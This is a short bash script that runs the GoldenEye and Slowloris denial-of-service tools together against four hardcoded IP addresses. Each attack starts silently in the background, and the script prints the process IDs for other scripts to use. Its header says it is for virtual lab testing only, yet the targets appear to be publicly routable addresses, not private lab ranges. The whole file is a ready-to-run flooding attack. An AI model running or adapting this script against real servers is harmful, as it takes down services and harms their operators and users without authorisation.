#!/bin/bash
# Combined GoldenEye + Slowloris Test Runner (For Virtual Lab Testing Only)

# === Target Servers ===
OWASP_SERVER="41.203.208.129"
METASPLOIT_SERVER="197.248.128.1"
SAMPLE_SERVER="197.248.128.2"
SIMPLE_SAMPLE="41.203.208.130"

# === GoldenEye Parameters ===
GE_WORKERS=200
GE_SOCKETS=500
GE_METHOD="random"
GE_DEBUG="-d"
GE_NOSSL="-n"
GE_SCRIPT="./goldeneye.py"
GE_LOGDIR="./logs_combined/goldeneye"
mkdir -p "$GE_LOGDIR"

# === Slowloris Parameters ===
SL_SCRIPT="./slowloris.py"
SL_PORT=80
SL_SOCKETS=200
SL_SLEEPTIME=10
SL_RAND_UA="--randuseragents"
SL_USE_HTTPS=""
SL_LOGDIR="./logs_combined/slowloris"
mkdir -p "$SL_LOGDIR"

# === Silent Attack Functions ===
attack_ge() {
    local NAME="$1"
    local URL="$2"
    python3 "$GE_SCRIPT" "$URL" -w "$GE_WORKERS" -s "$GE_SOCKETS" -m "$GE_METHOD" $GE_DEBUG $GE_NOSSL > "$GE_LOGDIR/${NAME}.log" 2>&1 &
    echo "$!"
}

attack_sl() {
    local NAME="$1"
    local IP="$2"
    python3 "$SL_SCRIPT" "$IP" -p "$SL_PORT" -s "$SL_SOCKETS" --sleeptime "$SL_SLEEPTIME" $SL_RAND_UA $SL_USE_HTTPS > "$SL_LOGDIR/${NAME}.log" 2>&1 &
    echo "$!"
}

# === Start Attacks (Silent) ===
sleep 2
PID_GE1=$(attack_ge "owasp" "https://$OWASP_SERVER")
PID_SL1=$(attack_sl "owasp" "$OWASP_SERVER")
sleep 3

PID_GE2=$(attack_ge "metasploit" "https://$METASPLOIT_SERVER")
PID_SL2=$(attack_sl "metasploit" "$METASPLOIT_SERVER")
sleep 3

PID_GE3=$(attack_ge "sample" "https://$SAMPLE_SERVER")
PID_SL3=$(attack_sl "sample" "$SAMPLE_SERVER")
sleep 3

PID_GE4=$(attack_ge "simple" "https://$SIMPLE_SAMPLE")
PID_SL4=$(attack_sl "simple" "$SIMPLE_SAMPLE")

# === Output PIDs silently for external scripts ===
echo "$PID_GE1 $PID_GE2 $PID_GE3 $PID_GE4 $PID_SL1 $PID_SL2 $PID_SL3 $PID_SL4"
